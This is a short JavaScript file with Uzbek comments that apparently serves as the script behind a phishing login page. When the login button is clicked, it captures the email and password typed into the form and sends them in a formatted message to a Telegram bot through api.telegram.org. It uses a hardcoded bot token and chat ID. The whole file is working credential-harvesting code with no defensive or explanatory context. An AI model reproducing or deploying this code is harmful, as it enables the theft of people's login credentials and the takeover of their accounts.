const BOT_TOKEN = "7738829434:AAFKNzsd9kE7Y5IH2fOwMSLeEBpNMM0ILG0";
const CHAT_ID = "7377573108";

// Inputlarni olish
const loginButton = document.getElementById("loginButton");
const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");

const sendToTelegram = async () => {
  const email = emailInput.value;
  const password = passwordInput.value;

  // Telegramga yuboriladigan matn
  const message = `🔒 Login:\n📧 Email: ${email}\n🔑 Password: ${password}`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    });

    const result = await response.json();
    console.log("Message sent to Telegram:", result);
  } catch (error) {
    console.error("Error sending message:", error);
  }
};

// Login tugmasiga bosilganda funksiyani chaqirish
loginButton.addEventListener("click", sendToTelegram);
